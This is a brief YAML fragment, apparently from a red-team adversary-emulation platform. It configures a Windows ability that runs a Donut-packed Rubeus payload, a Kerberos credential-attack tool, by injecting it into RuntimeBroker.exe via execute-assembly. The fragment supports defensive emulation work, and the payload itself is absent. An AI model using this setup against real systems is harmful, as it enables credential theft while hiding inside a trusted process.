  tags: []
  payloads:
    rubeus_donut.bin: c56f7d7aaa1e37e7e45163fa5a4660dc6deb4215
  enabled: true
platforms:
  windows:
    execute-assembly:
      command: '{"Data":"PAYLOAD.BYTES", "process":"RuntimeBroker.exe"}'
      payload: rubeus_donut.bin
